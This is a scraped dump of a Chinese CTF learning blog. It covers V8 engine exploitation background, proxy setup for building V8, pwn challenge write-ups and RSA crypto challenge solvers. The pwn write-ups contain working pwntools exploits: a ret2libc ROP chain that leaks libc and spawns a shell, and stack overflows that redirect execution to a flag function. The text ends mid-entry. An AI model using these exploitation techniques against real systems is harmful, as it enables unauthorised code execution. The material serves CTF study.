Baseline编译器：Full-Codegen","slug":"V8-Baseline编译器：Full-Codegen","date":"2019-12-16T06:59:50.000Z","updated":"2019-12-16T07:00:43.030Z","comments":true,"path":"2019/12/16/V8-Baseline编译器：Full-Codegen/","link":"","permalink":"https://darkwing.moe/2019/12/16/V8-Baseline%E7%BC%96%E8%AF%91%E5%99%A8%EF%BC%9AFull-Codegen/","excerpt":"","text":"Full-CodegenFull-Codegen存在的功能 将AST转换为汇编代码 作为JIT(Just in time)编译器 JIT编译器：在软件运行时执行编译，提高运行速度的机制 V8使用它，将要执行的Javascript代码转换为机器语言 输出的机器代码位于JIT区域(=RWX区域) EIP寄存器移到这个区域，然后执行 尚未优化","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[]},{"title":"V8简介","slug":"V8简介","date":"2019-12-16T06:31:58.000Z","updated":"2019-12-16T06:33:24.987Z","comments":true,"path":"2019/12/16/V8简介/","link":"","permalink":"https://darkwing.moe/2019/12/16/V8%E7%AE%80%E4%BB%8B/","excerpt":"","text":"什么是V8解释，执行Javascript代码的引擎 自身是C++实现 解析Javascript 代码，构造AST(抽象语法树) 基于AST，通过JIT编译器将其转换为汇编，执行 AST 抽象语法树大概是这样(以a+b为例)： V8也可以单独运行，一般是和其他项目一起被使用，例如Google Chrome，Node.js等 ##V8 Exploit之前 首先，我们需要了解V8的构造 并不需要全部了解（V8的代码更新很快） 但了解基本的概念是必须的 从Exploit角度深入了解 创建任意地址读写原语是否容易？ 是否能够早稳定的Exploit 这份PPT中主要讲解2016年4月的v8的结构，如果想了解现在的v8，可以参考这些资料： https://www.slideshare.net/ssuser6f246f/v8-javascript-engine-for https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine V8的编译器和优化编译器的种类V8最重要的组件就是编译器 内部大体上是这4种编译器： 旧的baseline编译器：Full-Codegen 旧的优化编译器：Crankshaft 新的优化编译器：TurboFan 新的baseline编译器：Ignition 下面这些资料可以用于参考： An overview of the TurboFan compiler TurboFan: A new code generation architecture for V8 编译器的历史V8内部编译器的变迁： 最初，Full-Codegen直接生成和执行机器语言 从AST生成机器代码(JIT)比较快,但生成的机器代码有很多冗余，有待进一步优化 2010年，针对hot-code优化目的，引入了Crankshaft 调用频率较高，机器代码生成时间还能再减少，判断可以更优化的代码 2015年，因为Crankshaft适配JavaScript的新规范比较麻烦，引入了新的TurboFan 2017年，为了维护效率，引入了用于生成中间代码的Ignition TurboFan专门优化中间代码 2018年至今，Full-Codegen和Crankshaft结束寿命，被删除 回到例题例题是2016年当时的latest 存在Full-Codegen，Crankshaft，TurboFan Hidden Class + Inline Caching也被用于优化 编译器与优化 Baseline编译器 Full-Codegen （对于这次例题exp的重要程度低） 优化机制 Hidden Class （更准确的说，Hidden Class是为自身加速的机制，而Inline Caching是以Hidden Class的信息为基础，进行优化的机制） Inline Caching 优化编译器 Crankshaft TurboFan 各种编译器在V8源码的src目录中： 其他应该知道的：","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[]},{"title":"V8环境","slug":"V8环境","date":"2019-12-09T05:31:12.000Z","updated":"2019-12-09T05:39:22.492Z","comments":true,"path":"2019/12/09/V8环境/","link":"","permalink":"https://darkwing.moe/2019/12/09/V8%E7%8E%AF%E5%A2%83/","excerpt":"","text":"网络墙国几个坑，常规代理方式(直接export 酸酸乳那种)不行 gclient内部跑download_from_google_storage时，是用不了socks的，只能用http代理，于是需要下载polipo，用它将socks转换为一个http代理， 12345678910111213141516171819$ cat /etc/polipo/config # This file only needs to list configuration variables that deviate# from the default values. See /usr/share/doc/polipo/examples/config.sample# and \"polipo -v\" for variables you can tweak and further information.logSyslog = truelogFile = /var/log/polipo/polipo.logproxyAddress = \"0.0.0.0\" socksParentProxy = \"10.211.55.2:1086\"socksProxyType = socks5 chunkHighMark = 50331648objectHighMark = 16384 serverMaxSlots = 64serverSlots = 16serverSlots1 = 32 然后重启服务修改终端代理为polipo 123sudo service polipo restartexport http_proxy=\"http://127.0.0.1:8123\"export https_proxy=\"https://127.0.0.1:8123\" 另外gclient内部好像用的boto吧，需要配置boto来采用此HTTP代理，于是需要： 在$HOME/.boto文件中写入: 123[Boto] proxy = 127.0.0.1proxy_port = 8123 export NO_AUTH_BOTO_CONFIG=$HOME/.boto 再次执行gclient sync 环境搭建这个就直接看傻哭啦博客，用的也是binja小哥的PPT v8 exploit | Sakuraのbloghttp://eternalsakura13.com/2018/05/06/v8/ 现在直接用ninja方式吧，如果已经make方式失败的话，需要重新fetch v8之后再用ninja方式 JS相关问题关于JavaScript引擎主流浏览器，渲染引擎，JS引擎 其他实现也很多，参考 https://blog.sessionstack.com/how-javascript-works-inside-the-v8-engine-5-tips-on-how-to-write-optimized-code-ac089e62b12e 两种常见模式模式一：脆弱的补丁，给出补丁信息，根据补丁分析攻击方法，使用JavaScript构造exp 模式二：过去的CVE问题，给出旧版本源码编译生成的二进制文件，前后的commit，某些情况也会给出PoC，通过这些信息使用JavaScript构造exp 攻略方法两种模式攻略流程大致如下： 特定版本的JS调试环境 如果提供了patch，build patch 分析patch，确定patch用于哪个进程 V8的话，Full-Codegen，Crankshaft，TurboFan，Ignition，AST，IC，… Full-Codegen和Crankshaft在2018坠吼的V8中已经不存在（之后会详细说） 创建利用此漏洞的Javascript代码片段 该代码会经过patch后的部分，造成bug 创建任意地址读写的原语 通常使用ArrayBuffer和TypedArray getshell 通常使用在JIT区域嵌入shellcode的方式 为什么要自己build 便于与正常二进制文件做比较 release的二进制文件已经打了补丁 设置断点会比较麻烦 内联函数用的比较多，难以找到函数地址 可以通过函数名设置断点，但函数名也难以找到 为了指定特定函数，需要解析所有命名空间后整理 但是，有许多匿名命名空间的函数 自己build的printf() 或者__asm__(&quot;int3&quot;) 速度更快 浮点数计算用的寄存器(xmm之类的)，用到的很频繁 使用gdb进行调试或者dump会很麻烦 另外，release的二进制文件一半没有调试符号，因此最好自己build TargetPPT中用的例子 Plaid CTF 2016 - Pwnable 666pts - js_sandbox V8的Pwn题，使用JavaScript来getshell，接近real world 当时的v8，已经和现在大不相同： 当时: Full-Codegen(JIT生成) + Crankshaft(优化1) + TurboFan(优化2) 现在: Ignition(JIT生成) + TurboFan(优化） 题目考查点存在于TurboFan中 必要知识 编译器优化相关知识 各种编译器之间的关系，编译器优化的触发条件 GC(垃圾回收)相关知识 GC的实现，触发条件 V8的内存结构和类型表现相关知识 整数，double，指针，字符串，特殊值，数组，ArrayBuffer 等 参考用的Writeup： https://gist.github.com/sroettger/d077d3907999aaa0f89d11d956b438ea https://rzhou.org/~ricky/pctf2016/js_sandbox.js","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[]},{"title":"ciscn_2019_c_1","slug":"ciscn-2019-c-1","date":"2019-11-26T08:51:02.000Z","updated":"2019-11-26T08:52:02.314Z","comments":true,"path":"2019/11/26/ciscn-2019-c-1/","link":"","permalink":"https://darkwing.moe/2019/11/26/ciscn-2019-c-1/","excerpt":"","text":"题目信息64位elf，开了NX 分析大概就是这样一个加解密程序，读取输入选择功能，encrypt读取用户输入，decrypt不可用 可以看出encrypt读取输入明显的溢出： 题目没有system和sh所以需要构造ROP。并且没有给出libc文件，但存在puts函数，可以用于leak。 所以就是leak出函数地址，确定libc，之后构造ROP exploitencrypt64位，puts函数一个参数，需要rdi寄存器的gadget，并且需要返回到开始位置： 另外因为输入会经过encrypt，异或处理，所以二次异或会还原，即输入的payload要先经过一次处理： 123456789101112def dd(enc): res = '' for i in range(len(enc)): if ord(enc[i]) &lt;= 96 or ord(enc[i]) &gt; 122: if ord(enc[i]) &lt;= 64 or ord(enc[i]) &gt; 90: if ord(enc[i]) &gt; 47 or ord(enc[i]) &lt;= 57: res += chr(ord(enc[i]) ^ 0xf) else: res += chr(ord(enc[i]) ^ 0xe) else: res += chr(ord(enc[i]) ^ 0xd) return res 然后gdb对pattern处理可以算出偏移为88: 不过实际打的时候不需要处理 几个坑exp很简单的，但有几个坑 leak那里用puts不用gets，原因是gets匹配出的结果太多了 然后，现在线上环境是18版本，直接拿网上流传的那些打的话会失败，因为那些是针对16版本的 如果gdb attach跟一下的话，会发现是正常走到了system步骤，但之后会报这样一个错误： 直接根据报错信息，能够搜到这篇文章： 在一些64位的glibc的payload调用system函数失败问题 – Ex个人博客http://blog.eonew.cn/archives/958 自己跟进去的话，能够看到确实是栈没对齐，那很简单，多加个ret对齐，再找个ret的gadget就可以： exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *from LibcSearcher import *sh = process('./ciscn_2019_c_1')# sh = remote('node3.buuoj.cn', 28271)elf = ELF('./ciscn_2019_c_1')# context.log_level = 'debug'# start = 0x400B28start = elf.sym['main']rdi_addr = 0x0000000000400c83puts_plt = elf.plt['puts']gets_got = elf.got['gets']puts_got = elf.got['puts']log.success('puts_plt =&gt; &#123;&#125;'.format(hex(puts_plt)))log.success('gets_got =&gt; &#123;&#125;'.format(hex(gets_got)))log.success('puts_got =&gt; &#123;&#125;'.format(hex(puts_got)))sh.sendlineafter('choice!\\n', '1')payload1 = 'a' * 88payload1 += p64(rdi_addr) + p64(puts_got) + p64(puts_plt)payload1 += p64(start)# payload1 = dd(payload1)sh.sendline(payload1)gdb.attach(sh)sh.recvuntil('@')sh.recvline()puts_leak = u64(sh.recvline()[:-1].ljust(8, '\\0'))log.success('puts_leak_addr =&gt; &#123;&#125;'.format(hex(puts_leak)))libc = LibcSearcher('puts', puts_leak)libc_base = puts_leak - libc.dump('puts')sys_addr = libc_base + libc.dump('system')bin_sh_addr = libc_base + libc.dump('str_bin_sh')log.success('libc_base_addr =&gt; &#123;&#125;'.format(hex(libc_base)))log.success('system_addr =&gt; &#123;&#125;'.format(hex(sys_addr)))log.success('bin_sh_addr =&gt; &#123;&#125;'.format(hex(bin_sh_addr)))sh.sendlineafter('choice!\\n', '1')payload2 = 'a' * 88payload2 += p64(0x4006b9) # add retpayload2 += p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)sh.sendline(payload2)sh.interactive()","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"pwn1_sctf_2016","slug":"pwn1-sctf-2016","date":"2019-11-13T07:42:00.000Z","updated":"2019-11-13T07:43:33.682Z","comments":true,"path":"2019/11/13/pwn1-sctf-2016/","link":"","permalink":"https://darkwing.moe/2019/11/13/pwn1-sctf-2016/","excerpt":"","text":"题目信息32位elf，开了NX 文件是C++的，需要安装下依赖 1sudo apt-get install lib32stdc++6 分析 存在vuln函数及get_flag函数 所以重点看vuln函数 fgets是读取输入，存在长度限制，但会把用户输入的I替换为you，这样三倍的长度就能够造成溢出： offset可以测试出来是21*3+1，即64 exploit12345678910111213from pwn import *# sh = process('./pwn1_sctf_2016')sh = remote('node3.buuoj.cn',28495)elf = ELF('./pwn1_sctf_2016')get_flag = elf.symbols['get_flag']log.success('get_flag_addr =&gt; &#123;&#125;'.format(hex(get_flag)))payload = 'I' * 21 + 'A' + p32(get_flag)sh.sendline(payload)print(sh.recv())","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"warmup_csaw_2016","slug":"warmup-csaw-2016","date":"2019-11-10T02:32:32.000Z","updated":"2019-11-10T02:33:23.099Z","comments":true,"path":"2019/11/10/warmup-csaw-2016/","link":"","permalink":"https://darkwing.moe/2019/11/10/warmup-csaw-2016/","excerpt":"","text":"题目信息基本信息64位elf，保护没开 静态分析IDA中可以看到，输出一个函数地址，然后gets，gets可能溢出 这个函数就是直接cat flag的函数 那么意图很明显，就是溢出后控制执行这个函数get flag 动态分析gdb中计算出offset为72: exploit12345678910111213#!/usr/bin/pythonfrom pwn import *sh = remote('node3.buuoj.cn', 28839)# context.log_level = 'debug'sh.recvuntil('WOW:')addr = sh.recvuntil('\\n')[:-1]# payload = 'A' * 72 + p64(int(addr, 16))payload = 'A' * 72 + p64(0x40060d)print payloadsh.writeline(payload)sh.interactive()","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"CTF中RSA类题目","slug":"CTF中RSA类题目","date":"2019-11-06T08:25:03.000Z","updated":"2019-11-06T08:25:41.738Z","comments":true,"path":"2019/11/06/CTF中RSA类题目/","link":"","permalink":"https://darkwing.moe/2019/11/06/CTF%E4%B8%ADRSA%E7%B1%BB%E9%A2%98%E7%9B%AE/","excerpt":"","text":"已知p,q,e,求d 在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出d作为flag提交 1234567891011121314from Crypto.PublicKey import RSAimport sysp = 473398607161q = 4511491e = 17n = (p - 1) * (q - 1)i = 0# 17x + ny = 1while True: if ((1 - n * i) % e == 0): break; i -= 1print '%d' % ((1 - n * i) / e) 已知p,q,e,c,求m Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm. p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 Use RSA to find the secret message 12345678910import gmpy2p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034s = (p - 1) * (q - 1)d = long(gmpy2.invert(e, s))n = p * qprint pow(c, d, n) 已知p,q,dp,dq,c,求m p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 其中关系式如下: dp=d%(p-1) dq=d%(q-1) 12345678910111213141516171819import gmpy2import binasciidef decrypt(dp, dq, p, q, c): InvQ = gmpy2.invert(q, p) mp = pow(c, dp, p) mq = pow(c, dq, q) m = (((mp - mq) * InvQ) % p) * q + mq print (binascii.unhexlify(hex(m)[2:]))p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852decrypt(dp, dq, p, q, c) 已知c1,e1,c2,e2,n,求m c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801e1=11187289c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397e2=9647291 这种属于 共模攻击， 识别：若干次加密，e不同，n相同，m相同。就可以在不分解n和求d的前提下，解出明文m。 1234567891011121314151617181920212223242526272829303132333435363738import syssys.setrecursionlimit(10000000)c1 = 22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361n = 22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801e1 = 11187289c2 = 18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397e2 = 9647291def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % ms = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1 &lt; 0: s1 = - s1 c1 = modinv(c1, n)elif s2 &lt; 0: s2 = - s2 c2 = modinv(c2, n)m = (pow(c1, s1, n) * pow(c2, s2, n)) % nprint '&#123;:x&#125;'.format(m).decode('hex') 已知e,n,dp,c, 求m e = 65537n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657 c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751 详细公式推导，来源： https://www.jianshu.com/p/74270dc7a14b 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364公式推导现在我们可以知道的是c≡me mod nm≡cd mod nϕ(n)&#x3D;(p−1)∗(q−1)d∗e≡1 mod ϕ(n)dp≡d mod (p−1)c≡me mod nm≡cd mod nϕ(n)&#x3D;(p−1)∗(q−1)d∗e≡1 mod ϕ(n)dp≡d mod (p−1)由式5*e可以得到dp∗e≡d∗e mod (p−1)dp∗e≡d∗e mod (p−1)因此可以得到d∗e&#x3D;k∗(p−1)+dp∗ed∗e≡1 mod ϕ(n)d∗e&#x3D;k∗(p−1)+dp∗ed∗e≡1 mod ϕ(n)我们将式1带入式2可以得到k∗(p−1)+dp∗e≡1 mod (p−1)∗(q−1)k∗(p−1)+dp∗e≡1 mod (p−1)∗(q−1)故此可以得到k2∗(p−1)∗(q−1)+1&#x3D;k1∗(p−1)+dp∗ek2∗(p−1)∗(q−1)+1&#x3D;k1∗(p−1)+dp∗e变换一下(p−1)∗[k2∗(q−1)−k1]+1&#x3D;dp∗e(p−1)∗[k2∗(q−1)−k1]+1&#x3D;dp∗e因为dp&lt;p−1dp可以得到e&gt;k2∗(q−1)−k1e&gt;k2∗(q−1)−k1我们假设x&#x3D;k2∗(q−1)−k1x&#x3D;k2∗(q−1)−k1可以得到x的范围为(0,e)(0,e)因此有x∗(p−1)+1&#x3D;dp∗ex∗(p−1)+1&#x3D;dp∗e那么我们可以遍历x∈(0,e)x∈(0,e)求出p-1，求的方法也很简单，遍历65537种可能，其中肯定有一个p可以被n整除那么求出p和q，即可利用ϕ(n)&#x3D;(p−1)∗(q−1)d∗e≡1 mod ϕ(n)ϕ(n)&#x3D;(p−1)∗(q−1)d∗e≡1 mod ϕ(n)推出d≡1∗e−1 mod ϕ(n)d≡1∗e−1 mod ϕ(n)注：这里的-1为逆元，不是倒数的那个-1作者：合天智汇链接：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;74270dc7a14b来源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 1234567891011121314151617181920#!/usr/bin/python# coding:utf-8import gmpy2import libnumfrom Crypto.Util.number import long_to_bytese = 65537n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751for i in range(1, 65538): if (dp * e - 1) % i == 0: if n % (((dp * e - 1) / i) + 1) == 0: p = ((dp * e - 1) / i) + 1 q = n / (((dp * e - 1) / i) + 1) phi = (p - 1) * (q - 1) d = gmpy2.invert(e, phi) % phi m = pow(c, d, n) print long_to_bytes(m) 给出公钥文件及加密文件，解密这种首先需要使用openssl 读取公钥文件pubkey.pem 12345678910111213openssl rsa -pubin -in pub.key -text -modulusPublic-Key: (256 bit)Modulus: 00:c0:33:2c:5c:64:ae:47:18:2f:6c:1c:87:6d:42: 33:69:10:54:5a:58:f7:ee:fe:fc:0b:ca:af:5a:f3: 41:cc:ddExponent: 65537 (0x10001)Modulus=C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+/AvKr1rzQczdAgMBAAE=-----END PUBLIC KEY----- 其中Modulus为n，将其转为10进制后分解出p和q，在线分解：http://factordb.com/ 123n = 86934482296048119190666062003494800588905656017203025617216654058378322103517p = 285960468890451637935629440372639283459q = 304008741604601924494328155975272418463 现在有了n,p,q,e,c，所以可以根据p,q求phi，再根据phi和e求d，接着根据c，d，n即可求出明文m。 12345678910111213141516171819from Crypto.PublicKey import RSAimport sysimport libnumfrom Crypto.Util.number import long_to_bytesimport gmpy2n = 86934482296048119190666062003494800588905656017203025617216654058378322103517p = 285960468890451637935629440372639283459q = 304008741604601924494328155975272418463e = 65537phi = (p - 1) * (q - 1)d = gmpy2.invert(e, phi)with open('/Users/miao/Downloads/0eaf8d6c-3fe5-4549-9e81-94ac42535e7b/flag.enc') as f: c = f.read().encode('hex') c = int(c, 16)m = pow(c, d, n)print mprint long_to_bytes(m) e特别大，wiener attack N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471 e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085 import hashlib flag = “flag{“ + hashlib.md5(hex(d)).hexdigest() + “}” https://github.com/pablocelayes/rsa-wiener-attack 1234N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085hacked_d = hack_RSA(e, N)print(\"d =\", hacked_d) Roll按行加密 {920139713,19} 70479679275221115227470416418414022368270835483295235263072905459788476483295235459788476663551792475206804459788476428313374475206804459788476425392137704796792458265677341524652483295235534149509425392137428313374425392137341524652458265677263072905483295235828509797341524652425392137475206804428313374483295235475206804459788476306220148 1234567891011121314151617#!/usr/bin/python# coding:utf-8import gmpy2from Crypto.Util.number import long_to_bytesn = 920139713p = 49891q = 18443e = 19phi = (p - 1) * (q - 1)d = gmpy2.invert(e, phi)m = \"\"with open('RSA_Roll.txt', 'r') as f: for c in f.readlines(): m += long_to_bytes(pow(int(c), d, n))print m 给出e及很多组n和c，求m m = xxxxxxxxe = 65537========== n c ==========n = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207c = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320 n = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759c = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855 n = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491c = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862 n = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751c = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613 n = 